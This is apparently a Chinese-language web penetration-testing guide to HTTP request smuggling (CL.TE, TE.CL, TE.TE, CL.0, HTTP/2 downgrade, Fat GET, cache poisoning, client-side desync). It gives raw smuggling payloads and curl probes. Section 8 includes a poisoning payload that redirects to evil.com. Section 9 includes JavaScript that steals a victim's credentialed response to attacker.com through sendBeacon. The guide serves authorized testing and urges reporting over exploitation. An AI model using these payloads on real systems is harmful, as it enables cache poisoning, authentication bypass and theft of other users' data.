---

phase: webapp
vuln_class: [request-smuggling, desync]
title: HTTP 请求走私测试
summary: 走私的唯一判据是「两个 HTTP 组件对同一字节流的分帧边界理解不同」。按「谁的 CL/TE 说了算」分五种形态，先做无副作用的探测再动手。
---

# HTTP 请求走私测试

缓存层相关的投毒见 [[web/漏洞分类/client-side.md|client-side.md]] §3；CRLF 注入见 [CRLF 注入测试](../CRLF注入/CRLF 注入测试.md)；H2 解析差异见 [HTTP2攻击](../HTTP2攻击/)。

## 0. 判据速查

| 观察到的现象 | 形态 | 去哪节 |
|---|---|---|
| 前后端都在，且能同时发 CL + TE | 前提成立 | §1 |
| 发探测包后**响应延迟** | 后端在等 chunked 结束 → CL.TE | §2 |
| 前端 400 拒绝双头 | 该跳严格，换混淆变体 | §4 |
| 目标支持 HTTP/2 且降级到 H1 | H2.CL / H2.TE | §5 |
| 有「不读 body 就响应」的端点（重定向/静态文件） | CL.0，**不需要 TE** | §3 |
| GET 带 body 被转发 | Fat GET | §6 |
| 能走私完整请求 + 有缓存 | 缓存投毒链 | §7 |
| 只有浏览器一侧能控 | 客户端 desync（CSD） | §8 |

**核心判据**：两个 HTTP 处理实体在**同一条 TCP/TLS 流**上，对「请求一在哪结束、请求二在哪开始」理解不同。攻击者把**部分或完整**的第二个请求塞进一个逻辑请求里。

```
客户端        前端(代理/WAF)              后端(源站)
  |                |                          |
  |== 请求 A+B ===>|                          |
  |                | 按边界 #1 解析            | 按边界 #2 解析
  |                |        \                 |        /
  |                |         切点不同
  v                v                          v
            看到 请求 A                看到 请求 A' + 走私的 B
```

**与 CRLF 注入的区别**：CRLF 注入目标是**响应**或**头行**；走私打的是 RFC 7230 的**消息分帧**（`Content-Length` / `chunked`）实现差异。

---

## 1. 前提与安全

**要成立必须有至少两跳**（CDN/WAF/反代 → 源站），且两跳对分帧的判断不同。单跳直连基本不用测。

**安全提醒**：并发走私会污染连接池、破坏缓存、影响其他租户。**优先在隔离环境或低峰期测**，发现后立即报告，不要深入利用。

---

## 2. CL.TE（前端信 CL，后端信 chunked）

**假设**：前端优先 `Content-Length`，后端优先 `Transfer-Encoding: chunked`。用一个很短 CL 让前端认为请求已结束，后端继续按 chunked 解析，剩余字节留给下一个请求。

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- **前端（CL）**：只读 13 字节（`0\r\n\r\nSMUGGLED` 正好 13 字节），认为请求完整
- **后端（chunked）**：`0` 是结束块，**`SMUGGLED` 及之后**成为下一个请求的起始字节流

**字节数算法**：`0` + `\r\n` + `\r\n` + `SMUGGLED` = 1+2+2+8 = 13。

**探测用最小包**（看时间差，不产生副作用）：

```http
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

```

后端等 chunked 结束 → **响应延迟** = CL.TE 疑似。

---

## 3. TE.CL（前端信 chunked，后端信 CL）

**假设**：前端按 chunked 解析，后端只读 `Content-Length`。把 **CL 设成 chunk 长度行的字节数**（通常是 `4`：两个十六进制字符 + `\r\n`），后端只消费长度行，剩下字节留在缓冲区等后续请求拼接。

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

- **后端（CL）**：只读 body 开头 4 字节 → `3` `5` `\r` `\n`，标记 body 结束，剩余字节留在 TCP 读缓冲
- **前端（chunked）**：把整条流按 chunked 解析，`GET /admin...` 被当作**已结束的第一个请求**的 body 内容

**chunk 长度必须精确**：`35` 是十六进制 = 53 字节，正好是 `GET /admin HTTP/1.1\r\nHost: target.example\r\nFoo: x\r\n\r\n` 的长度。改路径或头就要重算。

更长的走私（如 `POST` + `Content-Length: 11` + `x=1`）chunk 长度约 `76`（0x76 = 118 字节），但 `Content-Length: 4` 仍能把后端钉在只读长度行。

---

## 4. TE.TE（两边都声称处理 TE，但判定不同）

两边都处理 `Transfer-Encoding`，但对**哪个值有效**判断不同 → 一边看到 chunked，另一边没看到。

**8 个混淆变体**（`[TAB]` 表示真实 `\x09`）：

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```

```http
 Transfer-Encoding: chunked
```
（行首一个空格）

```http
X: X
Transfer-Encoding: chunked
```
（利用行续接/宽松头解析，一跳可能错误合并或拆分；`X` 与 `Transfer-Encoding` 之间可能是 `\n` 或 `\r\n`）

```http
Transfer-Encoding
: chunked
```
（字段名和冒号在**不同物理行**，部分解析器仍当合法）

**策略**：对每一对（前端，后端），枚举哪边接受哪个变体，然后映射回 CL.TE 或 TE.CL。

---

## 5. CL.0（不需要 TE）

后端**完全忽略 `Content-Length`**，把 body 长度当 0 —— 不管 CL 说什么。剩余 body 字节留在 socket 缓冲给下一个请求。

**和 CL.TE/TE.CL 的关键区别：不需要 `Transfer-Encoding`。**

**易受影响的端点**：

- 读 body 之前就返回响应的（重定向 301/302、204）
- 忽略 POST body 的静态文件服务器
- 健康检查端点
- 在 `Connection: close` 下仍复用 socket 的实现

```http
POST /redirect-page HTTP/1.1
Host: target.example
Content-Length: 30

GET /admin HTTP/1.1
X: x
```

1. 后端立刻发 301，不消费 body
2. `GET /admin HTTP/1.1\r\nX: x` 留在 socket 缓冲
3. 该连接上的下一个请求被前面这段字节污染

**检测**：

```bash
# 1. 找不消费 body 就响应的端点（重定向、204、静态页收 POST）
# 2. 发 CL 大于实际 body 的 POST
curl -X POST https://target.com/static-page \
  -H "Content-Length: 50" \
  -d "GET /canary HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --http1.1
# 3. 同连接发后续请求
# 若响应是 /canary 的内容而非预期页面 → CL.0 确认
```

**与 CL.TE 的对比**：

| 维度 | CL.TE | CL.0 |
|---|---|---|
| 需要 TE 头 | 是 | **否** |
| 分歧点 | CL vs TE | CL vs「忽略 body」 |
| 无 chunked 支持时 | 不行 | 可以 |
| 常见目标 | 解析 TE 的代理 | 静态服务器、重定向端点 |

---

## 6. HTTP/2 走私

### 6.1 H2.CL

前端与客户端说 HTTP/2，向源站降级成 HTTP/1.1。H2 有自己的帧长度，但代理可能同时把 `content-length` 转发给源站。两者不一致时，**前端信帧边界，后端信 content-length**。

```
1. 客户端发 H2 POST：
   - H2 DATA 帧内容： "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length 头：0
2. 前端（H2）：把整个 DATA 帧当第一个请求的 body → 以 H1 POST 转发
3. 后端（H1）：看到 content-length: 0 → body 为空
   → 剩余字节 "GET /admin HTTP/1.1..." 被解析成第二个请求
```

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

**确认方法**：

```
1. 发 H2 POST，content-length: 0，body 以 "G" 开头
2. 同连接立刻发正常 GET /
3. 后端看到 "GGET / HTTP/1.1" → 405 或报错 → 确认

时间版：
- 走私 "GET /sleep?delay=10 HTTP/1.1..."
- 同连接后续请求被延迟 → 确认
```

### 6.2 H2.TE

HTTP/2 规范**禁止** `transfer-encoding`。但部分前端代理降级到 H1 时没剥掉。源站看到 `transfer-encoding: chunked` 就按 chunked 解析，而前端用的是 H2 帧边界。

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example

```

**变体**（部分代理会归一化 TE 头）：

```http
transfer-encoding: chunked
Transfer-Encoding: chunked      # 大写（H2 要求小写）
transfer-encoding: identity     # 本该剥掉但可能透传
transfer-encoding:  chunked     # 多空格
transfer-encoding: chunked\r\n  # 尾部空白
```

### 6.3 伪头/头注入

攻击面来自下游 H1 解析器把某些字节当成**新请求起点**：

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

若一跳把整串留在头值里、下一跳在 H1 重建时错误拆分，就会在 `\r\n\r\n` 处开始新的 `GET /`。

**测试方向**：
- H2 里 `Transfer-Encoding` / `Content-Length` 的重复与大小写处理（H2 要求小写，转换层可能失手）
- `:method` 或 `:path` 含异常字符时的降级行为
- 隧道 / 扩展 CONNECT 与走私的交互

---

## 7. Fat GET

部分反代允许 GET 带 body（RFC 7230 允许但不推荐）。**前端转发 body，后端对 GET 忽略 body** → body 字节留在缓冲。

```http
GET / HTTP/1.1
Host: target.example
Content-Length: 55

GET /admin HTTP/1.1
Host: target.example
Cookie: admin=true

```

**行为矩阵**：

| 组件 | GET body 行为 |
|---|---|
| Nginx（作代理） | 转发 body |
| Apache（作代理） | 通常转发 |
| HAProxy | 默认转发 |
| AWS ALB | 可能剥掉 |
| Cloudflare | 可能剥掉 |
| Express.js（后端） | 默认忽略 |
| Gunicorn（后端） | 忽略 |
| PHP-FPM | 忽略 |

**前端转发 + 后端忽略 = desync。**

**配合缓存**：

```http
GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 70

GET /admin/delete-user?id=1 HTTP/1.1
Host: target.example
Cookie: admin=true

```

若代理缓存 `/static/app.js`，走私请求的响应可能被缓存到那个 URL 下。

---

## 8. 走私 → 缓存投毒链

```
1. 攻击者走私一个返回恶意内容的请求
2. 前端把该响应关联到某个可缓存 URL
3. 缓存把恶意响应存到合法 URL 下
4. 后续所有访问该 URL 的用户拿到污染内容
```

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```

**发生什么**：

1. 前端（CL）：整段当一个 POST
2. 后端（TE）：POST 在 `0\r\n\r\n` 结束，`GET /static/app.js` 是新请求
3. 后端响应这个走私的 GET，但响应被匹配到**同连接的下一个合法请求**
4. 若下一个合法请求就是 `/static/app.js` → 缓存存下这个响应 → 投毒

**定向投毒**：走私一个返回攻击者可控内容的请求。

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?url=https://evil.com/malicious.js HTTP/1.1
Host: target.example
X-Ignore: x
```

若 `/redirect` 返回 302 到 `evil.com`，且缓存把它存到下一个请求的 URL 下，那个 URL 对所有用户都变成跳转到 `evil.com`。

**响应队列错位**：

```
连接上：请求 A（走私）→ 响应 A；请求 B（受害者的）→ 响应 B
缓存以为：请求 B 的 URL → 响应 B
实际：  请求 B 的 URL → 响应 A
```

响应 A 里若有 XSS 或跳转，就被缓存在 B 的 URL 下。

---

## 9. 客户端 desync（CSD）

不打共享连接池，而是污染**受害者浏览器自己到目标的连接**。

**前提**：

1. 目标服务器复用连接（不是每个响应都 `Connection: close`）
2. 目标（或同站）有攻击者可注入 JS 的页面
3. 服务器有「不消费完整 body」的端点（CL.0 形态）

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    // 1. 触发 desync（trigger 端点是 CL.0）
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: smuggledRequest
    });

    // 2. 同连接上的后续请求
    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    // 3. 响应不匹配就外带
    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',                       // CL.0 易感端点
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

**局限**：

- 浏览器可能给后续请求换连接 → desync 失败
- 服务端 `Connection: close` 阻止复用
- 同站 cookie 策略限制凭证携带
- 连接复用难以可靠预测
- 浏览器安全模型不让直接读响应，成功表现为**其他请求的副作用**或服务端日志异常

**暂停式 desync**：

```
1. 服务端有超时：body 在 N 秒内没接收完整就发响应并继续
2. 攻击者发 fetch()：Content-Length: 1000，实际只发 50 字节 + 走私请求
3. 服务端超时，对部分请求响应
4. 剩余字节（走私请求）留在缓冲
5. 同连接下一个请求处理走私字节
```

---

## 10. 产品行为矩阵

### 10.1 CL + TE 处理

| 产品 | 双 CL+TE | 优先 | 说明 |
|---|---|---|---|
| **HAProxy** | 都转发 | TE | 有 TE 时剥 CL（可配） |
| **Nginx** | 拒绝（400） | — | 严格，难以穿透 |
| **Apache（mod_proxy）** | 都转发 | CL | 历史 CL.TE 源头 |
| **Cloudflare** | 归一化 | TE | 有 TE 时剥 CL，归一化强 |
| **AWS ALB** | 归一化 | 不定 | 历史上有 CL.TE 漏洞（已修） |
| **AWS CloudFront** | 归一化 | CL | 可能放过 TE 混淆变体 |
| **Varnish** | 都转发 | TE | 可配，默认偏好 TE |
| **Traefik** | 都转发 | TE | 基于 Go `net/http`，chunked 解析严格 |
| **Envoy** | 拒绝（400） | — | HTTP/1.1 解析极严 |
| **Caddy** | Go 系，严格 | TE | 严格度接近 Envoy |
| **Squid** | 都转发 | CL | 历史 TE.CL 源头 |
| **IIS（ARR）** | 都转发 | CL | 历史 CL.TE/TE.CL 源头 |

### 10.2 H2 → H1 降级

| 产品 | 降级 | TE 头处理 | CL 透传 |
|---|---|---|---|
| HAProxy | 转换 | 可能透传 TE | 传 CL |
| Nginx | 转换 | 通常剥 TE | 传 CL |
| Cloudflare | 转换 | 剥 TE | 归一化 CL |
| AWS ALB | 转换 | 剥 TE | 传 CL |
| AWS CloudFront | 转换 | 可能透传混淆 TE | 传 CL |
| Envoy | 转换 | 剥 TE | 严格校验 |
| Traefik | 转换 | 可能透传 TE | 传 CL |

### 10.3 GET body 与连接复用

| 产品 | 转发 GET body | 后端连接池 | 对走私的影响 |
|---|---|---|---|
| HAProxy | 是 | 有 | **高风险**，走私数据影响其他用户 |
| Nginx | 是（作代理） | 有（keepalive upstream） | **高风险** |
| Apache | 是 | 有 | 高风险 |
| Cloudflare | 剥掉 | 有 | 高风险但归一化强 |
| AWS ALB | 视版本 | 有 | 高风险 |
| Varnish | 剥掉 | 可配 | 看 `beresp.do_stream` |
| Envoy | 是 | 有 | 风险较低（解析严格） |

---

## 11. 测试流程

### 11.1 安全探测顺序

```
1. 认架构
   - 看 Via / Server / X-Served-By 头
   - 认 CDN（Cloudflare cf-ray、CloudFront x-amz-cf-id）

2. 探 HTTP 版本
   - curl --http2 https://target.com -v
   - ALPN 协商是否含 h2

3. 时间差探测（无副作用）
   a. CL.TE：
      POST / HTTP/1.1
      Content-Length: 4
      Transfer-Encoding: chunked

      1
      A
      0

   b. 响应延迟 → 后端在等 chunked 结束 → 疑似 CL.TE

4. H2 desync
   - 发 H2 请求，content-length: 0，body 带走私前缀
   - 随后发正常请求，看响应是否匹配走私路径

5. CL.0
   - 找不消费 body 就响应的端点（重定向、静态文件）
   - 发超长 body 的 POST，随后发正常 GET
```

### 11.2 工具

| 工具 | 用途 |
|---|---|
| **Burp — HTTP Request Smuggler**（BApp Store） | 自动检测 desync、常见变体、时间差 |
| **defparam/smuggler** | Python 脚本批量生成/发送探测包 |
| **simple-http-smuggler-generator** | 快速拼原始 CL.TE / TE.CL 模板 |
| **h2csmuggler** | HTTP/2 cleartext 走私 |
| **http2smugl** | H2 专项 desync |
| **hyper**（Python） | 底层构造 H2 帧 |
| `curl --http2` / `--http1.1` | 手动 H1/H2 探测 |

**用法建议**：先被动确认是**前端 + 源站**两跳，再选最小破坏性探测，生产环境降并发。

### 11.3 影响升级清单

```
□ 确认 desync 变体（CL.TE / TE.CL / H2.CL / H2.TE / CL.0）
□ 能走私完整请求吗？（不只是前缀）
□ 连接池开着吗？（影响其他用户 → 严重）
□ 有可缓存端点吗？（→ 缓存投毒）
□ 能到认证端点吗？（→ 认证绕过、数据窃取）
□ 响应里能反射内容吗？（→ 经缓存变成存储型 XSS）
□ 能到 admin/内网路径吗？（→ 提权）
□ 客户端 desync 可行吗？（→ 针对单用户）
```

---

## 12. 纪律

- **先确认是两跳**。单跳直连测走私是浪费时间；`Via` / `Server` 头不一致才是信号。
- **先时间差，后内容验证**。时间差探测不产生副作用，内容验证会污染连接池。顺序反了会伤到别人。
- **并发降到 1**。走私天生依赖连接复用，高并发会让你打到自己的请求，也让别人受影响。
- **CL.0 最容易被忽略**。它不需要 TE，只要有一个「不读 body 就响应」的端点 —— 这种端点在真实系统里到处都是。
- **发现即报告，不深入利用**。走私的影响范围是**其他用户**，越深入利用越容易造成实际损害。
- **报的是「能读到别人的请求/能投毒缓存」不是「有 desync」**。要给出可复现的影响证明。
